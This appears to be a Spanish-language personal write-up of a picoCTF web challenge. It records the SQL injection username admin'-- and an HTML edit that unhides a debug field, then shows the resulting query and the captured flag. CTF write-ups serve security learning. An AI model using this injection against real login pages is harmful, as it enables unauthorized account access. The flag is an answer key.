## Descripción

There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!
## Pistas

1. There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
2. Try to think about how the website verifies your login.

## Solución

`Pusimos "admin'--" en el user y en la parte del código de la página, quitamos el "hidden" del 3er botón y le cambiamos el valor de "0" a "1"`

![[Pasted image 20250327123914.png]]


`username: admin'--`
`password: admin`
`SQL query: SELECT * FROM users WHERE name='admin'--' AND password='admin'`

# `Logged in!`

`Your flag is: picoCTF{s0m3_SQL_f8adf3fb}`
## Notas Adicionales



## Referencias
- 

